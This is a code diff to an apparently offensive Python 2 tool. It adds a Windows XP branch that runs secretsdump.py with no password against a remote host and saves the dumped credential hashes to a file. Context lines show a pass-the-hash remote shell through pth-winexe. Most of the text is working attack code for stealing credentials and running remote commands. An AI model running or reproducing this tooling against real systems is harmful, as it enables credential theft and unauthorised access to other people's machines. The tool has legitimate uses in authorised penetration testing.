@@ -308,6 +308,23 @@ def get_ip_address(ifname):
 	)[20:24])
 
 def datadump(user, passw, host, path, os_version):
+	
+	#Temporary workaround for Windows XP where Admin User has no password
+	if os_version=="Windows 5.1" and passw=="":
+		print colored("[+]Windows XP Detected with No Password - Be patient this could take a couple of minutes: ",'yellow')
+		
+		if not os.path.exists(path+host):
+			os.makedirs(path+host)
+			print colored("[+]Creating directory for host: "+host,'green')
+
+		proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+'@'+host+" -no-pass -outputfile "+outputpath+host+'/'+host+'.txt', stdout=subprocess.PIPE,shell=True)
+		print proc.communicate()[0]		
+
+		print colored("[+]Files written to: "+path+host,'green')
+		print colored("[+]Exiting as other features will not work at the minute with this configuration, Sorry!!: ",'yellow')
+		exit(1)
+
+
 	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
 	if not signal_number:
